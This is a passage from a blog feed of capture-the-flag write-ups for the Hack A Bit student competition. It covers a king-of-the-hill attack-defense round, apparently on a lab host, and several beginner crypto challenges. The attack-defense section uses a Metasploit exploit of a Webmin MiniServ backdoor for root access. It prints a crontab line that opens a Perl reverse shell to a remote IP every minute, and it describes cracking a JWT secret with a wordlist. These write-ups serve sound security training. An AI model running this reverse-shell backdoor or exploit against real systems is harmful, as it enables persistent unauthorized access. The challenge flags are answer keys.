&lt;p&gt;Examining the code, we see it simply opens a file that we specify, and prints out its contents. Since &lt;code&gt;/home/breakme-harder/flag.txt&lt;/code&gt; is only accessible by the &lt;code&gt;breakme-harder&lt;/code&gt; user, and the binary runs as the &lt;code&gt;breakme-harder&lt;/code&gt; user, we can use this to read the contents of the flag.&lt;/p&gt;

  &lt;img src=&#34;./img/box5.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Flag: &lt;code&gt;flag{evaluate_this_my_dude}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;aboutface-150&#34;&gt;AboutFace (150)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Author: Nate Singer (Helix)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Different box this time, your target is now 10.128.0.4&amp;ndash;straight to root. Remember that there may be non-vulnerable services on the machine. Recon is the #1 focus.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Once you have access to the box stay at the top of the hill and listen for flags on localhost:5000/tcp. You will get alive notices once every 60 seconds while you are connected so you can be sure that you&amp;rsquo;ll receive flags at the specific release times. To see the release times check out the other section.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Caviets You are root. This means you can do whatever you want, for the most part. You are welcome to lock people out but only in specific ways. If you accidentially take down any of the existing services or remove Nate&amp;rsquo;s ability to SSH in for monitoring the machine will be reverted to the last known-good snapshot and you will probably lose access. This also goes for changing the flag files. If we determine that the flags has been altered the machine will also be reverted. Lastly, if someone has concurrent access for four flags in a row we may block them from future access to give others the opportunity to attack the machine&amp;ndash;we&amp;rsquo;ll decide this in real time during the weekend depending on how things go.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Okay, now we are given a different machine to attack. Again scanning the machine with &lt;code&gt;nmap&lt;/code&gt;, we discover a few services.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65529&lt;/span&gt; closed ports
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT      STATE SERVICE    VERSION
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;21/tcp    open  ftp        ProFTPD
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;3306/tcp  open  mysql      MariaDB &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unauthorized&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;4369/tcp  open  epmd       Erlang Port Mapper Daemon
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;5000/tcp  open  tcpwrapped
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;10000/tcp open  http       MiniServ 1.890 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Webmin httpd&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Searching online for vulnerabilities, we find that the service &lt;code&gt;MiniServ 1.890&lt;/code&gt; is vulnerable to &lt;a href=&#34;https://www.rapid7.com/db/modules/exploit/unix/webapp/webmin_backdoor/&#34;&gt;Unauthenticated RCE&lt;/a&gt;!&lt;/p&gt;
&lt;p&gt;Using Metasploit again, we exploit the vulnerability and get RCE.&lt;/p&gt;

  &lt;img src=&#34;./img/box6.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;We find the flag in &lt;code&gt;/root/flag.txt&lt;/code&gt;.&lt;/p&gt;

  &lt;img src=&#34;./img/box8.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Since the box is down as I&amp;rsquo;m writing this, the image is someone else running &lt;code&gt;cat /root/flag.txt&lt;/code&gt; which I had in my terminal history, where I captured their traffic with &lt;code&gt;tcpdump&lt;/code&gt; ;)&lt;/p&gt;
&lt;p&gt;Flag: &lt;code&gt;flag{bestow_the_crown}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;king-of-the-hill-30&#34;&gt;King of The Hill (30)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Once you have access to the fourth machine in the range you need to listen on port tcp/5000, you can do this with nc, for example. The flag will be sent at a specific time. Retain control of the box to get all the flags. We will spam the flag a few times around that point in time so that you are sure to receive it if you have things setup properly.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;We also may reset the machine if we determine that you have locked folks out in a way that gives you an unfair advantage. The vulnerable service on the box must stay present. We also may reset the machine any time two consecutive flags are retrieved by the same competitor.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Additionally, we will send alive notices once every 60 seconds. If you have a valid listener you will receive these alive notices, BUT if you aren&amp;rsquo;t careful your server may die when the connection closes!!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is a continuation of &lt;code&gt;AboutFace&lt;/code&gt;, assuming we already have a shell on that machine. I will document some interesting events of roughly what happened below.&lt;/p&gt;
&lt;p&gt;There were 8 points in time where the flag would be sent on the machine to port &lt;code&gt;5000&lt;/code&gt;. Anyone listening to the port would recieve the flag.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    ├── 1. 7pm PST, Friday (30)
    ├── 2. 9am PST, Saturday (30)
    ├── 3. 11am PST, Saturday (30)
    ├── 4. 1pm PST, Saturday (30)
    ├── 5. 3pm PST, Saturday (30)
    ├── 6. 5pm PST, Saturday (30)
    ├── 7. 9am PST, Sunday (30)
    └── 8. 11am PST, Sunday (30)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;However, as this is attack defense, with every player sharing the same &lt;code&gt;AboutFace&lt;/code&gt; machine, players can patch vulnerabilities and given &lt;code&gt;root&lt;/code&gt; permissions, could just nuke the whole box. It was quite interesting what events unfolded.&lt;/p&gt;
&lt;h2 id=&#34;attack-defense&#34;&gt;Attack Defense&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Eth007&lt;/code&gt; first got access on the box and patched the MiniServ vulnerability, as well as getting the first KOTH flag. Upon the vulnerability being patched, no other players could access the machine, so they were KOTH for the first round. Same thing happened for the second round, and &lt;code&gt;Eth007&lt;/code&gt; also got the second KOTH flag.&lt;/p&gt;
&lt;p&gt;As for the third (or fourth?) round, the machine was reset and I was able to exploit the vulnerability and access the machine. However, unfortunetely at that time the bot sending the alive pings and the flag died, so the flag was never sent. Since I was listening for the flag, the organiser (&lt;code&gt;Nate Singer (Helix)&lt;/code&gt;) just DM&amp;rsquo;ed me the flag.&lt;/p&gt;
&lt;p&gt;Afterwards, many players had gained access to the &lt;code&gt;AboutFace&lt;/code&gt; box and were already implementing their countermeasures to prevent other players from accessing the box. For example, shells and processes were being killed, but in particular at one point, someone decided to entirely delete the &lt;code&gt;netcat&lt;/code&gt; binary! Furthermore, the &lt;code&gt;perl&lt;/code&gt; command was replaced with something else like &lt;code&gt;cat&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This killed my backdoor which I implemented with &lt;code&gt;crontab&lt;/code&gt;, having a reverse shell sent to a specific port to my IP every minute, since my reverse shell used &lt;code&gt;perl&lt;/code&gt;. I only figured this out after my shells were killed, and after trying to exploit &lt;code&gt;MiniServ&lt;/code&gt; (which was the initial access) didn&amp;rsquo;t work. I was using Metasploit, which failed to exploit as it said the server wasn&amp;rsquo;t vulnerable. However, this meant it didn&amp;rsquo;t even try the exploit - it just said it wasn&amp;rsquo;t vulnerable. After setting an option in Metasploit, it surprisingly worked and I get my shell back!&lt;/p&gt;

  &lt;img src=&#34;./img/box7.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Confirming that &lt;code&gt;perl&lt;/code&gt; command didn&amp;rsquo;t work anymore, I hurry to put a new backdoor before I&amp;rsquo;m kicked out again. Checking &lt;code&gt;/usr/bin&lt;/code&gt; I can see the &lt;code&gt;perl&lt;/code&gt; binary is still there, so I can still run it with &lt;code&gt;/usr/bin/perl&lt;/code&gt;. And thus, I edited my crontab backdoor, which finally worked!&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo &amp;#39;* * * * * /usr/bin/perl -MIO -e &amp;#34;\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\&amp;#34;10.128.0.2:17893\&amp;#34;);STDIN-&amp;gt;fdopen(\$c,r);\$~-&amp;gt;fdopen(\$c,w);system\$_ while&amp;lt;&amp;gt;&amp;#34;&amp;#39; | crontab -
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A short while after I got locked out of initial access, the backdoor proved to come in clutch as it gave me access right back after being locked out.&lt;/p&gt;
&lt;p&gt;But then suddenly, after the box was reset and many players gained access, while waiting for the flag, the box died. The box continued to stay offline for the remainder of the competitions, with noone recieving the 6th, 7th or 8th flag. Not sure what caused the box to crash, maybe someone ran &lt;code&gt;shutdown&lt;/code&gt;, we all had root permissions after all.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;You made it to the end! Hope you enjoyed the writeups, if there&amp;rsquo;s anything I missed or suggestions please let me know on discord or elsewhere. This was my first time doing anything related to Attack Defense in a CTF so it was quite interesting, and I look forward to next year&amp;rsquo;s competition!&lt;/p&gt;
&lt;p&gt;Oh, and, huge thanks to &lt;a href=&#34;https://www.youtube.com/channel/UC1yduXnGCQ6qJW9O7QMVN7w&#34;&gt;&lt;code&gt;Nate Singer (helix)&lt;/code&gt;&lt;/a&gt; for organising the competition as well as address all the issues with challenges!&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Full Writeups - Hack A Bit CTF Qualifiers 0x01</title>
      <link>https://TheSavageTeddy.github.io/posts/writeups-hackabit2023/</link>
      <pubDate>Wed, 01 Mar 2023 00:00:00 +0800</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/posts/writeups-hackabit2023/</guid>
      <description>Overview Hack A Bit is a CTF targeting highschool students aged 13-18. This post will include writeups for all challenges (except OSINT) for Round 2, which was the CTF jeopardy round.
Also, please contact me discord TheSavageTeddy#7458 if there are any mistakes/issues with these writeups, or if you want more info on them. Enjoy!
Challenge Categories Welcome - 4 challenges
Cryptography - 8 challenges
Web - 6 challenges
Programming - 8 challenges</description>
      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Hack A Bit is a CTF targeting highschool students aged 13-18. This post will include writeups for all challenges (except OSINT) for Round 2, which was the CTF jeopardy round.&lt;/p&gt;
&lt;p&gt;Also, please contact me discord &lt;code&gt;TheSavageTeddy#7458&lt;/code&gt; if there are any mistakes/issues with these writeups, or if you want more info on them. Enjoy!&lt;/p&gt;
&lt;h1 id=&#34;challenge-categories&#34;&gt;Challenge Categories&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;#0-welcome&#34;&gt;&lt;code&gt;Welcome&lt;/code&gt;&lt;/a&gt; - 4 challenges&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;#1-cryptography&#34;&gt;&lt;code&gt;Cryptography&lt;/code&gt;&lt;/a&gt; - 8 challenges&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;#2-web&#34;&gt;&lt;code&gt;Web&lt;/code&gt;&lt;/a&gt; - 6 challenges&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;#3-programming&#34;&gt;&lt;code&gt;Programming&lt;/code&gt;&lt;/a&gt; - 8 challenges&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;#4-infrastructure&#34;&gt;&lt;code&gt;Infrastructure&lt;/code&gt;&lt;/a&gt; - 8 challenges&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;#5-networking&#34;&gt;&lt;code&gt;Networking&lt;/code&gt;&lt;/a&gt; - 6 challenges&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;#6-osint&#34;&gt;&lt;code&gt;OSINT&lt;/code&gt;&lt;/a&gt; - 8 challenges&lt;/p&gt;
&lt;h1 id=&#34;0-welcome&#34;&gt;0. Welcome&lt;/h1&gt;
&lt;h2 id=&#34;wakeup-5&#34;&gt;Wakeup (5)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Throughout the course you will prove your completion of tasks and understanding by capturing flags. CTF stands for capture the flag. Flags will generally be formatted as flag{x} where the x is the specific content that will change from challenge to challenge. If this isn&amp;rsquo;t the case, the challenge will specifically state that it uses a non-standard flag format.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Submit the flag &lt;code&gt;flag{hello_world}&lt;/code&gt; to complete this challenge.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Sanity check challenge, flag was in the description.
&lt;code&gt;flag{hello_world}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;weirdo-5&#34;&gt;Weirdo (5)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;This is what a challenge with a non-standard flag will look like. These types of flags are generally used for things like IP addresses or other data that would be a &amp;ldquo;short answer&amp;rdquo; style. The challenge will always be marked with a &amp;ldquo;NON-STANDARD FLAG FORMAT&amp;rdquo; identifier if it is this way.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Submit the flag 192.168.1.1/24 to get credit for this challenge.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Same thing, flag is &lt;code&gt;192.168.1.1/24&lt;/code&gt;. This just tells us some challenges are not in the normal &lt;code&gt;flag{}&lt;/code&gt; format.&lt;/p&gt;
&lt;h2 id=&#34;support-5&#34;&gt;Support (5)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Throughout the competition you may want to ask for help. Where can you do that? How can staff members ensure that all information is moderated and everyone receives the same level of support? The answer is that Hack a Bit uses a support forum in discord.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Navigate to the support form in the competition group and find the thread for this challenge.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://www.discord.gg/hack-a-bit&#34;&gt;www.discord.gg/hack-a-bit&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Joining the discord and navigating to the challenge support posts we find this &lt;code&gt;flag{helpHelpHELP_desk}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;billboard-5&#34;&gt;Billboard (5)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;What do you get for winning the competition? Where do you look for details on this round and future rounds of the 0x01 season? Check out the HaB website&amp;rsquo;s competition page for more information, there&amp;rsquo;s something there for you.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Going to &lt;a href=&#34;https://www.hackabit.com/competition&#34;&gt;https://www.hackabit.com/competition&lt;/a&gt; we find &lt;code&gt;flag{you_might_need_this_for_later}&lt;/code&gt; below the prizes.&lt;/p&gt;
&lt;h1 id=&#34;1-cryptography&#34;&gt;1. Cryptography&lt;/h1&gt;
&lt;h2 id=&#34;homerun-75&#34;&gt;Homerun (75)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Check out 0xFF in the ASCII lookup table&amp;hellip;&lt;br&gt;
Oh dang, it isn&amp;rsquo;t there. Well I still need to send you that data, not the text but the actual value 0xFF in computer memory.
Here&amp;rsquo;s an example, decode this, all the data you need is right here: &lt;code&gt;MZWGCZ33I5XXI5DBJVQWWZKTOVZGKWLPOVEGKYLSIFRG65LUKRUGC5CMN5XGOQTBNRWH2===&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We get a ciphertext &lt;code&gt;MZWGCZ33I5XXI5DBJVQWWZKTOVZGKWLPOVEGKYLSIFRG65LUKRUGC5CMN5XGOQTBNRWH2===&lt;/code&gt;. This is clearly base32 as we see it consists of only uppercase letters and numbers, ending with &lt;code&gt;=&lt;/code&gt; (padding). Decoding in CyberChef or any other tool gives &lt;code&gt;flag{GottaMakeSureYouHearAboutThatLongBall}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;mason-75&#34;&gt;Mason (75)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;The numbers mason, what do they mean?
&lt;code&gt;66 6c 61 67 7b 63 6f 6d 70 75 74 65 72 3a 69 5f 6f 6e 6c 79 5f 75 6e 64 65 72 73 74 61 6e 64 5f 62 69 6e 61 72 79 5f 64 75 64 65 7d&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ciphertext consists of 0-9 and a-f, hinting that it&amp;rsquo;s hex. Decoding from hex gives &lt;code&gt;flag{computer:i_only_understand_binary_dude}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;smiley-100&#34;&gt;Smiley (100)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Existing encryption is dumb, so I came up with something better. Maybe its a little emotional or whatever, but I feel like you can get through that part&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Breaking this teaches you some of the primative concepts professionals use to attack novel cryptographic algorithms. It also demonstrates in a primative way why we use established and tested ones for real applications. It also loosely relates to a concept called &amp;ldquo;known plaintext.&amp;rdquo;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;In the prompt, there is no punctuation and everything is lowercase alphabetical characters.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Given a file containing this:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;🤣😅😇😉 😁😅😀🥰🤣 😚🥰😜🤗😇🤑🤫😉 😀 🫡😇😉🤣 😜🤐 🤣😅🤫 😶😮‍💨😇😁😜🤑🤫 🤫🤥😜🤤😇 😁😅😀🥰😀😁🤣🤫🥰😉 😀😮‍💨🤑 😉🤫🤕😶🤫😮‍💨😁🤫😉 🤮😇🤣😅 😇🤥😀🥶🤫😉 🤐🥰😜🤥 🤑😇🤐🤐🤫🥰🤫😮‍💨🤣 🤗🤫😮‍💨🤑😜🥰😉 😁🫡🤑🥰 😮‍💨😀🤥🤫 🤑😀🤣🤫 😉😜😶🥰😁🤫 😀😮‍💨🤑 🤯🤫🥳🤮😜🥰🤑😉 🤐🫡😀🥶🥸😉🤥😇🫡🤫😎🤥😜🥰🤫😎😉🤥😇🫡🤫😎🤠😇🥶🥶🤫🥰🧐
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This challenge was a bit annoying. It was clearly frequency analysis, which is like using the fact that letters &lt;code&gt;e&lt;/code&gt;, &lt;code&gt;a&lt;/code&gt; etc are more common than &lt;code&gt;q&lt;/code&gt; or &lt;code&gt;z&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;First I mapped each emoji to a unique character or number using this (uncleaned) code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;emoji_text &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;🤣😅😇😉 😁😅😀🥰🤣 😚🥰😜🤗😇🤑🤫😉 😀 🫡😇😉🤣 😜🤐 🤣😅🤫 😶😮‍💨😇😁😜🤑🤫 🤫🤥😜🤤😇 😁😅😀🥰😀😁🤣🤫🥰😉 😀😮‍💨🤑 😉🤫🤕😶🤫😮‍💨😁🤫😉 🤮😇🤣😅 😇🤥😀🥶🤫😉 🤐🥰😜🤥 🤑😇🤐🤐🤫🥰🤫😮‍💨🤣 🤗🤫😮‍💨🤑😜🥰😉 😁🫡🤑🥰 😮‍💨😀🤥🤫 🤑😀🤣🤫 😉😜😶🥰😁🤫 😀😮‍💨🤑 🤯🤫🥳🤮😜🥰🤑😉 🤐🫡😀🥶🥸😉🤥😇🫡🤫😎🤥😜🥰🤫😎😉🤥😇🫡🤫😎🤠😇🥶🥶🤫🥰🧐&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; string &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ascii_lowercase
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ascii_lowercase &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1234567890&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mapping &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nextind &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;txt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; thing &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; emoji_text:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; thing &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;:txt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;;&lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; thing &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; mapping&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        mapping[thing] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cs[nextind]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        txt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; mapping[thing]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        nextind&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        txt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; mapping[thing]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(txt)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This gave us &lt;code&gt;abcd ebfga hgijckld f mcda in abl opqrceikl lsitc ebfgfealgd fpqrk dluolpqreld vcab csfwld ngis kcnnlglpqra jlpqrkigd emkg pqrfsl kfal diogel fpqrk xlyvigkd nmfwzdscml1sigl1dscml12cwwlg3&lt;/code&gt; to work with, which is much more readable.&lt;/p&gt;
&lt;p&gt;Then I used &lt;a href=&#34;https://quipqiup.com/&#34;&gt;quipquip&lt;/a&gt;, a cryptogram solver.&lt;/p&gt;

  &lt;img src=&#34;./img/quipquip.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;This gives us the flag &lt;code&gt;flag{smilemoresmilebigger}&lt;/code&gt;, or something like that.&lt;/p&gt;
&lt;h2 id=&#34;matchmaker-100&#34;&gt;Matchmaker (100)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;There are a variety of symmetric cryptosystems out there, but most of them involve a logic block called a XOR. The key is &amp;ldquo;hab&amp;rdquo;(UTF8). We&amp;rsquo;re giving you the key and the algorithm, how hard can it be?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Dg0DDxoRBz4PHQIKNxIbBQwHHBMbFQ==&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given base64, and the XOR key &amp;ldquo;hab&amp;rdquo;. Using CyberChef we can decrypt and XOR to get the flag. &lt;code&gt;flag{so_much_symmetry}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/matchmaker1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;h1 id=&#34;hancock-125&#34;&gt;Hancock (125)&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;I stole this session token from someone and it looks like all I need to do is change admin to true for all the power&amp;hellip; no idea who signed it though&amp;hellip; can you figure out the secret for me so that we can get some pwnage going?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;The secret for this token is somewhere in the RockYou wordlist &lt;a href=&#34;https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt&#34;&gt;https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We are given this string&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxMjM0NTY3ODkwLCJhZG1pbiI6ZmFsc2V9.QR_da_OHe58LBwBRt5S_aTcbMkBhEFqJkFn7zUq7Yyc
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;which is clearly a JWT (Json Web Token).&lt;/p&gt;
&lt;p&gt;These are commonly issued as a cookie to authenticate a user, such as for a session. We can verify this by going to &lt;a href=&#34;https://jwt.io/&#34;&gt;https://jwt.io/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The flag is the secret that was used to sign the JWT.&lt;/p&gt;

  &lt;img src=&#34;./img/jwt.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%;&#34;  /&gt;


&lt;p&gt;Looking up a tool to brute force secrets for the JWT, we find &lt;a href=&#34;https://github.com/mazen160/jwt-pwn&#34;&gt;jwt-pwn&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Using this, we brute force possible secrets with the &lt;a href=&#34;https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt&#34;&gt;rockyou.txt wordlist&lt;/a&gt;, and get the flag &lt;code&gt;ghosthunter&lt;/code&gt;&lt;/p&gt;

